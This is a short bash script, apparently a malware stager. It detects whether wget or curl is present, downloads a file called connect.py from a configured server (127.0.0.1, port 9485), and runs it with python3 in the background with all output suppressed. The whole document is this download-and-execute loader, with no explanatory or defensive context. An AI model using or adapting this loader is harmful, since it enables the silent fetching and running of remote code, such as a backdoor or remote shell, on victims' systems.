#!/bin/bash

server_ip="127.0.0.1"
server_port=9485;
schema="http://"

cnt () {
   outp=$($1 2>&1 );
   if [ "${outp#*$2}" != "$outp" ];
    then 
        return 0;
    else
        return 1;
    fi
}

get=""
payload=""
cnt "wget" "missing URL"
if [ $? -eq 0 ];
then
    get="wget"
else
    cnt "curl" "try 'curl --help'"
    if [ $? -eq 0 ];
    then
        get="curl";
    else
        exit;
    fi;
fi;

if [ $get = "wget" ];
then 
    payload="wget $schema$server_ip:$server_port/scripts/connect -O connect.py"
else
    payload="curl $schema$server_ip:$server_port/scripts/connect -o connect.py"
fi;

$payload >/dev/null 2>&1 && python3 connect.py > /dev/null 2>&1 & 